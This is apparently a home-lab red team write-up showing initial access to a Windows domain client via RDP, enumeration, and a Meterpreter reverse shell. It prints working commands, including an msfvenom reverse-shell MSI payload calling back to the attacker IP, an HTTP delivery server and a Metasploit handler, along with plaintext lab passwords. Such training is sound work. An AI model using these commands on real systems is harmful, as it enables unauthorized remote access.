# ICEMAN Lab - Phase 2
### Red Team Simulation: Initial Access to Meterpreter Shell
**Date:** May 17, 2026 | **Domain:** cyberlab.local | **Attacker:** 192.168.56.103 | **Target:** 192.168.56.102

---

## Lab Environment

| VM | Role | IP |
|----|------|----|
| SIEM | Security Monitoring | - |
| ActiveDirectory-Server | Domain Controller | - |
| window-Client | Target Machine | 192.168.56.102 |
| kali-linux-2025.4 | Attacker | 192.168.56.103 |

---

## Step 1 - Lab Setup (Screenshot 2.1)

All 4 VirtualBox VMs confirmed running before starting the lab.

---

## Step 2 - Create AD User (Screenshots 2.2 - 2.3)

Created a low-privilege domain user via Active Directory Users and Computers on the Domain Controller.

| Field | Value |
|-------|-------|
| Name | Plot Twist |
| UPN | PlotTwist@cyberlab.local |
| Domain | CYBERLAB |
| OU | cyberlab.local/Users |
| Privileges | Standard User (no admin) |

---

## Step 3 - Reconnaissance (Screenshot 2.4)

```bash
nmap -sV 192.168.56.102
```

**Results:**
- Port 135/tcp open - msrpc (Microsoft Windows RPC)
- OS: Windows
- MAC: 08:00:27:C6:D4:BD (Oracle VirtualBox NIC)

---

## Step 4 - Initial Access via RDP (Screenshots 2.5 - 2.8)

**Attempt 1 - netexec (failed):**
```bash
netexec rdp 192.168.56.102 -u PlotTwist -p Malcolm12!
```
> Result: NLA:False confirmed but CredSSP error 0xc000018d - wrong password

**Attempt 2 - xfreerdp (success):**
```bash
xfreerdp /v:192.168.56.102 /u:WINDOWS\\PlotTwist /p:Iceman2026! /cert:ignore /sec:tls
```
> Result: Session established as `CYBERLAB\PlotTwist`

**Session Check:**
```
whoami          -> windows\plottwist
whoami /priv    -> Medium integrity, no SeDebugPrivilege, no SeImpersonatePrivilege
```

---

## Step 5 - Post-Access Enumeration (Screenshots 2.9 - 2.14)

**Local Admin Group:**
```bash
net localgroup administrators
```
> Members: Administrator, CYBERLAB\Domain Admins, mbritt - PlotTwist NOT listed

**Privilege Escalation Attempt:**
```bash
net localgroup administrators PlotTwist /add
```
> System error 5 - Access is denied

**LocalSystem Services:**
```powershell
Get-WmiObject win32_service | Select Name, StartName, PathName | Where-Object {$_.StartName -eq "LocalSystem"} | Format-List
```
> Services running as SYSTEM identified: Appinfo, AppMgmt, AppReadiness, AppVClient, AppXSvc

**System32 ACL:**
```powershell
Get-Acl "C:\Windows\System32" | Format-List
```
> Owner: NT SERVICE\TrustedInstaller | BUILTIN\Users: ReadAndExecute only

**Scheduled Tasks:**
```bash
schtasks /query /fo LIST /v
```
> OneDrive task runs as PlotTwist | .NET NGEN tasks run as SYSTEM | No writable paths found

**Token/Integrity:**
```bash
whoami /groups
```
> Mandatory Label: **Medium Mandatory Level** (S-1-16-8192) - standard user confirmed

---

## Step 6 - Payload Creation & Delivery (Screenshots 2.15 - 2.17)

No direct privilege escalation path found - pivoted to MSI payload delivery.

**Generate payload on Kali:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f msi -o iceman.msi
```
> Payload size: 460 bytes | MSI size: 159,744 bytes | Saved as: iceman.msi

**Host payload via Python HTTP server:**
```bash
python3 -m http.server 8080
```

**Target downloads payload:**
> Browser navigated to `http://192.168.56.103:8080` from Windows client - iceman.msi visible in directory listing and downloaded

---

## Step 7 - Listener & Shell Execution (Screenshots 2.18 - 2.19)

**Initial handler - port 4444, shell payload (failed):**
```bash
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LPORT 4444
run -j
```
> No session created - shell payload dropped connection

**Upgraded to Meterpreter - port 5555 (success):**
```bash
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 5555
run -j
```

| Session | Source | Time | Status |
|---------|--------|------|--------|
| 1 | 192.168.56.102:61828 | 15:37:31 | Died |
| 2 | 192.168.56.102:61829 | 15:37:35 | Died |
| 3 | 192.168.56.102:61833 | 15:37:50 | Active |
| 4 | 192.168.56.102:61834 | 15:37:53 | Active |

> **Sessions 3 and 4 established. Meterpreter shell active on target.**

---

## Attack Chain Summary

| # | Phase | Tool | Result |
|---|-------|------|--------|
| 1 | Lab Setup | VirtualBox | 4 VMs running |
| 2 | User Creation | Active Directory | PlotTwist created |
| 3 | Recon | nmap -sV | Port 135 open, Windows confirmed |
| 4 | Initial Access | xfreerdp | RDP session as PlotTwist |
| 5 | Enumeration | whoami, net localgroup, PowerShell | Low priv confirmed, no esc path |
| 6 | Payload | msfvenom (MSI) | iceman.msi generated |
| 7 | Delivery | Python HTTP server | MSI downloaded to target |
| 8 | Execution | MSI run on target | Reverse connection initiated |
| 9 | C2 | Meterpreter / port 5555 | Sessions 3 & 4 active |

---

> **Authorized lab environment only. For educational and training purposes.**
